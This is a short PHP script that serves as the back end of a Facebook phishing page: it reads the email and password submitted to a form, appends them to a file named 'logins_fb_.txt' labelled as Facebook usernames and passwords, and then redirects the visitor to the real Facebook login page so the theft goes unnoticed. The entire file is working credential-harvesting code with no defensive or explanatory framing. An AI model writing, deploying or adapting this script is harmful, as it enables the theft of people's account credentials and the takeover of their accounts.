<?php
if (!empty($_POST['email']) && !empty($_POST['pass'])) {
    $user = filter_var($_POST['email'], FILTER_SANITIZE_FULL_SPECIAL_CHARS);
    $pass = filter_var($_POST['pass'], FILTER_SANITIZE_FULL_SPECIAL_CHARS);
}
file_put_contents("logins_fb_.txt", "Facebook Username:-> " . $user . " Pass:-> " . $pass . "\n", FILE_APPEND);

header('Location: https://facebook.com/login');

exit();
